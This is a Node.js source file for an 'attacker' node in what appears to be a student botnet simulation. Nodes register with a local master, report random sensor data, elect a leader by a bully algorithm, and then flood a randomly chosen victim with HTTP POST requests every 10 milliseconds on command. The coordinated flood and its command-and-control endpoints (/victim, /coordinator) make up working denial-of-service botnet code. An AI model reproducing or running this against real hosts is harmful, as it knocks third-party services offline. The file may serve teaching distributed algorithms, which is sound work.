var express = require("express");
var app = express();
var request = require("request");
app.use(express.static(__dirname + '/'));
var bodyParser = require('body-parser');

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

var serverAddress = "http://127.0.0.1:8080"; // default server address
var id = process.argv.slice(2) || "My IoT"; // attacker id is defined as an argument
var leader = true; // attacker is leader flag
var responsesReceived = 0; // used for election algorithm
var electionsSent = 0; // used for election algorithm
var attackingInterval; // interval that leads the attack
var attackersData = {}; // JSON that contains all the attackers' ip and port

// Callback function when a HTTP PUT method is requested, in the path '/election'
// Broadcast the election message to all, responds with an OK
app.put("/election", function(req, res) {
	console.log("receiving election...");
	res.send("OK");
	sendElectionToAll();
});

// Callback function when a HTTP POST method is requested, in the path '/election'
// Broadcast the election message to all,
app.post("/election", function(req, res) {
	console.log("starting election...");
	sendElectionToAll();
	res.sendStatus(200);
});

// Callback function when a HTTP POST method is requested, in the path '/coordinator'
// Notification about the new leader
app.post("/coordinator", function(req, res) {
	console.log("The leader is: " + req.body.leader);
	res.sendStatus(200);
});

// Callback function when a HTTP POST method is requested, in the path '/victim'
// Starts the attack to the received victim
app.post("/victim", function(req, res) {
	console.log("attacking...");
	console.log(req.body.victim);
	attackingInterval = setInterval(function () {attackVictim(req.body.victim)}, 10);
	res.sendStatus(200);
});

// Callback function when a HTTP DELETE method is requested, in the path '/victim'
// Stops the attack
app.delete("/victim", function(req, res) {
	console.log("stopping attack...")
	clearInterval(attackingInterval);
	res.sendStatus(200);
});

// Returns a random bounded number
function randomizer(min, max) {
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Builds a JSON with the attacker's "sensors" data
function buildJSONbody() {
	var sensor0, sensor1, sensor2;
	var d = new Date();

	sensor0 = randomizer(-20, 20) * 5;
	sensor1 = randomizer(-20, 20) * 5;
	sensor2 = randomizer(-20, 20) * 5;

	var jsonbody = "{ \"id\" : \"" + id + "\", \"datetime\" : \"";
	jsonbody += d.getFullYear() + "-";
	jsonbody += (d.getMonth()+1) + "-";
	jsonbody += d.getDate() + " ";
	jsonbody += d.getHours() + ":";
	jsonbody += d.getMinutes() + ":";
	jsonbody += d.getSeconds();
	jsonbody += "\", \"data\" : { \"sensor0\" : " + sensor0;
	jsonbody += ", \"sensor1\" : " + sensor1;
	jsonbody += ", \"sensor2\" : " + sensor2 + " }}";

	return jsonbody;
}

// Sends sensor data to server, as an 'attacker' HTTP PUT request
function sendSensorData() {
	request.put({
	  headers: {"content-type" : "application/json"},
	  url:     serverAddress + "/attacker",
	  body:    buildJSONbody()
	}, function(error, res, body){
		// Receives information of all the connected attackers as a response
	  	attackersData = JSON.parse(body);
	});
}

// Send a "i'm coordinator" notification to all the attackers and the server
function sendLeaderToAll(leader) {
	sendLeaderTo(leader, serverAddress);
	for (var key in attackersData) {
		if (!(key === id)) {
			sendLeaderTo(leader, "http://" + attackersData[key].ip + ":" + attackersData[key].port);
		}
	}
}

// Send a 'coordinator' HTTP POST message
// Then selects a random victim from the received list and starts the attack
function sendLeaderTo(leader, address) {
	request.post({
	  headers: {"content-type" : "application/json"},
	  url:     address + "/coordinator",
	  body:    JSON.stringify({"leader": leader})
	}, function(error, res, body){
	  if (!(body === "OK") && !(body === undefined)) { // avoid overflow of attacking messages
	  	console.log("I'm the leader");
	  	// choose a random victim and start the attack
	  	sendAttackRequestToAll(chooseRandomVictim(JSON.parse(body)));
	  }
	});	
}

// Sends an start attack message to the server and all the attackers
function sendAttackRequestToAll(victim) {
	console.log(victim + " is going to die!");
	console.log("God have mercy on it's soul...");
	sendAttackRequestTo(victim, serverAddress);
	for (var key in attackersData) {
		if (!(key === id)) {
			sendAttackRequestTo(victim, "http://" + attackersData[key].ip + ":" + attackersData[key].port);
		}
	}
}

// Send a 'victim' HTTP POST message to a given address
function sendAttackRequestTo(victim, address) {
	request.post({
	  headers: {"content-type" : "application/json"},
	  url:     address + "/victim",
	  body:    JSON.stringify({"victim": victim})
	}, function(error, res, body){
	});
}

// Choose a random victim from a given array of victims
function chooseRandomVictim(victims) {
	return victims[Math.floor(Math.random() * victims.length)];
}

// Send an 'election' HTTP PUT message to a given ip and port
// Then waits for all the responses to check if this attacker is the leader
function sendElectionTo(msg, ip, port) {
	request.put({
	  headers: {"content-type" : "application/json"},
	  url:     "http://" + ip + ":" + port + "/election",
	  body:    JSON.stringify(msg)
	}, function(error, res, body){
	  	console.log(body);
	  	if (body === "OK") { // If another attacker answers with OK, ignore this attacker as a leader
	  		leader = false;
	  	}
	  	responsesReceived++;
	  	if (responsesReceived === electionsSent && leader) { // Received all the responses and no OK
	  		sendLeaderToAll(id); // Send leader notification to all
	  	}
	});
}

// Send a election message to all the attackers
function sendElectionToAll() {
	responsesReceived = 0; // amount of responses received
	electionsSent = 0; // amount of election messages sent
	leader = true; // starts as a leader, changes to false if a OK is received
	console.log("sending election to other attackers...");
	for (var key in attackersData) {
	  	if (key > id) {
			electionsSent++; // counts the attackers with bigger ids
		}
	}
	if (electionsSent === 0) { // no attackers with bigger ids found, current attacker is leader
		console.log("no attacker with bigger id...");
		sendLeaderToAll(id);
	} else {
		for (var key in attackersData) { // send election message to all the attackers with bigger id
			if (key > id) {
				console.log(key);
				sendElectionTo({"id": id}, attackersData[key].ip, attackersData[key].port);
			}
		}
	}
}

// Send a 'victim' HTTP POST message to start the attack
function attackVictim(victim) {
	request.post({
	  headers: {"content-type" : "application/json"},
	  url:     "http://" + victim + "/",
	  body:    JSON.stringify({"x":"D"})
	}, function(error, res, body){
	});
}

// Send this attacker port to master as an 'attacker' HTTP POST message
// Then start sending sensors' data
function sendPortToMaster() {
	request.post({
	  headers: {"content-type" : "application/json"},
	  url:     serverAddress + "/attacker",
	  body:    JSON.stringify({"port": port, "id": id})
	}, function(error, res, body){
	  setInterval(sendSensorData, 1000);
	});	
}

// Starts attacker server, tries until it uses an available port
function connect(p) {
	app.listen(p, function() {
		sendPortToMaster(); // send port to master when a connection is established
	}).on('error', function(err) { // if it fails, increase port number and try again
		port++;
		console.log("Unavailable port. Increasing by 1, now trying on port: " + port);
		connect(port);
	});
	console.log("Attacker on:" + port);
}

//Starts this attacker. Default Port would be 8081, else +1
var port = 8081;
connect(port);